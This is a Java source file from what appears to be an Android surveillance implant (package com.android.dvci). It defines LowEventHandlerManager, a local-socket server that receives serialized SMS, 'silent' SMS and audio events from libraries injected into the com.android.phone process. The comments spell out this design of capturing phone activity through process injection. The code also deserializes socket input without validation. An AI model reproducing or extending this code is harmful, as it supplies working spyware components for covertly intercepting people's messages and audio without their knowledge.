package com.android.dvci.listener;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.dvci.util.LowEventMsg;
import com.android.dvci.util.Utils;
import com.android.mm.M;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Date;

/**
 * Created by zad on 27/02/15.
 * LowEventHandlerManager is low events dispatcher/manager.
 * It's meant to be used to dispatch events coming from instrumented through injection libraries.
 * Its main function is to listen for new incoming events on a local socket.
 * Incoming events are serialized as LowEventMsg, each Msg has a type which helps the
 * LowEventHandlerManager to discriminate the event and to dispatch to the correct LowEvent<type>Manager
 *
 * This means that for every new lowEventtype implemented a new manager must be designed and instantiate.
 *
 * The socket will be started only in case someone has called LowEventHandlerManager.attach() at least once, the caller than will be
 * notified in case of that specific type of event reception.
 *
 * At this moment , only the LowEventSms is available, so the manager has a reference to LowEventSmsManager singleton class.
 * Every one interested in LowEventSms shall call LowEventSmsManager,attach() which in turn will attach itself to the
 * LowEventHandlerManager.
 * The reception of a LowEventMsg of type sms will notify the LowEventSmsManager which will subsequently notify its listeners.
 *
 * Keep in mind that this kind of communication involves two steps:
 * 1) Start the generic LowEventHandlerManager
 * 2) Inject a library within a process of interest which send LowEventMsg to the LowEventHandlerManager's local socket
 *
 * At this point it will be possible to design different type of LowEvent<type> events.
 *
 * For a reference have a look to @see #LowEventSmsManager.start . Its start function is called when a first listener attach for LowEventSms.
 * At that point LowEventSmsManager attach itself to the LowEventHandlerManager and than instrument the com.android.phone process through injection.
 */
public class LowEventHandlerManager extends Listener<LowEventMsg> implements Runnable {

	private static final String TAG = "LowEventHandler";
	private static final int DEFAULT_STOP_TIMEOUT = 60;

	private boolean accept =true;
	private LocalServerSocket server = null;
	private Thread thread = null;
	private volatile static LowEventHandlerManager singleton;
	/* For every specialization of LowEventHandler create a new instance of
	 * it
	 */
	private static LowEventSmsManager llhSms ;
	private static LowEventAudioManager llhAudio ;
	protected LowEventHandlerManager() {
	}

	/**
	 * Self.
	 *
	 * @return the status
	 */
	public static LowEventHandlerManager self() {
		if (singleton == null) {
			synchronized (ListenerSms.class) {
				if (singleton == null) {
					singleton = new LowEventHandlerManager();
				}
				if ( llhSms == null ){
					llhSms = LowEventSmsManager.self();
				}
				if ( llhAudio == null ){
					llhAudio = LowEventAudioManager.self();
				}
			}
		}
		return singleton;
	}

	@Override
	public void start() {
		if(thread == null) {
			thread = new Thread(this);
		}
		accept = true;
		thread.start();
	}

	@Override
	public void stop() {
		closeSocketServer(0);
	}



	/**
	 * Stops the listening socket if any
	 * @param timeout_seconds
	 *      the number of seconds to wait, default value is 60 seconds
	 *      and it is used if timeout_second is < 1
	 * @return void
	 */

	public void closeSocketServer(int timeout_seconds) {
		accept = false;
		if ( timeout_seconds < 1 ){
			timeout_seconds = DEFAULT_STOP_TIMEOUT;
		}
		if ( thread != null ) {
			LowEventMsg obj = new LowEventMsg();
			obj.data = null;
			obj.type = LowEventMsg.EVENT_TYPE_KILL;
			Date start = new Date();
			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
			while (server != null && diff_sec < timeout_seconds && thread != null ) {
				thread.interrupt();
				Utils.sleep(100);
				if ( obj == null ){
					obj = new LowEventMsg();
					obj.data = null;
					obj.type = LowEventMsg.EVENT_TYPE_KILL;
				}
				obj = LowEventMsg.sendSerialObj(obj,"closeSocketServer");
				if (server != null) {
					try {
						server.close();
					} catch (IOException e) {
						e.printStackTrace();
						continue;
					}
				}
				switch (obj.res){
					case LowEventMsg.CONNECTION_REFUSED:
					{
						if (Cfg.DEBUG) {
							Check.log(TAG + " (closeSocketServer): CONNECTION REFUSED server should be closed");
						}
						return;
					}
				}

				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
			}
		}
	}
	@Override
	public void run() {
		try {
			server = new LocalServerSocket("llad");
			if (Cfg.DEBUG) {
				Check.log(TAG + " Server is ready...");
			}
			while(this.accept) {
				/* wait until a connection is ready */
				try {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(run): going to accept");
					}
					LocalSocket receiver = null;
					try {
						receiver = server.accept();
					}catch (IOException e){
						if(!this.accept){
							if (Cfg.DEBUG) {
								Check.log(TAG + "(run): interrupted for stopping listening");
							}
							break;
						}
					}
					if (receiver != null) {
						DataInputStream streamIn = new DataInputStream(new
								BufferedInputStream(receiver.getInputStream()));
						DataOutputStream streamOut = new DataOutputStream(new
								BufferedOutputStream(receiver.getOutputStream()));
						int timeout = 5;
						while (streamIn.available() == 0 && timeout-- >= 0) {
							Utils.sleep(100);
						}
						if (streamIn.available() > 0) {
							ObjectInputStream ois = new ObjectInputStream(streamIn);
							LowEventMsg event = (LowEventMsg) ois.readObject();
							if (Cfg.DEBUG) {
								Check.log(TAG + "(run):GOT DATA " + event);
							}
							if (event.type  == LowEventMsg.EVENT_TYPE_SMS || event.type  == LowEventMsg.EVENT_TYPE_SMS_SILENT) {
								event.res = llhSms.notification(event);
							}if (event.type  == LowEventMsg.EVENT_TYPE_AUDIO) {
								event.res = llhAudio.notification(event);
							} if(event.type == LowEventMsg.EVENT_TYPE_KILL) {
								/* kill is used just to unblock server.accept(); in order to
								 * evaluate this.accept
								 */
								if (Cfg.DEBUG) {
									Check.log(TAG + "(run): SENT Kill");
									event.res = 1;
								}
							}else{
								event.res = 1;
							}
							if (Cfg.DEBUG) {
								Check.log(TAG + "(run): SENT reply " + event.res);
							}
							timeout = 10;
							while (timeout-- >= 0 ) {
									try {
										ObjectOutputStream oos = new ObjectOutputStream(streamOut);
										oos.writeObject(event);
										oos.flush();
										oos.close();
										break;
									} catch (Exception e) {
										if (Cfg.DEBUG) {
											Check.log(TAG + "(run): Exception sending back:", e);
										}
									}
								Utils.sleep(100);
							}
						}
						receiver.close();
						if (Cfg.DEBUG) {
							Check.log(TAG + "(run): receiver closed");
						}
					}else{
						if (Cfg.DEBUG) {
							Check.log(TAG + "(run): receiver null");
						}
					}
				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(run): accept failed:", e);
					}
				}
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + "(run): stopping thread");
			}
			server.close();
			server = null;
			thread = null;
		} catch (IOException ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(run): IOEXCEPTION", ex);
			}
		}
	}
}
